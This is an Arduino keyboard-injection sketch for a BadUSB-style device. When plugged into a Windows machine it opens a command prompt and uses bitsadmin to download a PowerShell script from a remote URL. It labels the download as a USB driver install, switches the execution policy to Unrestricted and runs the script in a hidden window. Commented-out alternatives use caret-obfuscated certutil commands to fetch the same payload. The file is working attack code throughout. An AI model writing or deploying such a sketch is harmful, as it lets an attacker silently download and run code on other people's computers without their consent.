#include <Keyboard.h>

void setup() {
  Keyboard.begin(); //Start keyboard communication
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.println("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  //Keyboard.println(" FOR /F \"delims=/ tokens=1\" %a IN ('where certutil')DO %a -url^cache -spli^t -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");
  //Keyboard.println("FOR /F \"tokens=*\" %g IN ('where certutil.exe') do (SET VAR=%g)");
  //Keyboard.println("copy %var% \"Documents/abc.exe\" ");
  //Keyboard.println(" \"Documents/abc.exe\" -url^cache -spli^t -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");

  //bitsadmin /transfer "Descargando Drivers USB" /download /priority high "https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1" %TEMP%/poc.ps1 && echo Instalando Drivers:
  Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" %TEMP%/poc.ps1 && echo Instalando Drivers: ");
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  Keyboard.println("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  Keyboard.println("powershell.exe -windowstyle hidden -file \"%TEMP%/poc.ps1\"");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

}
void loop() {
}
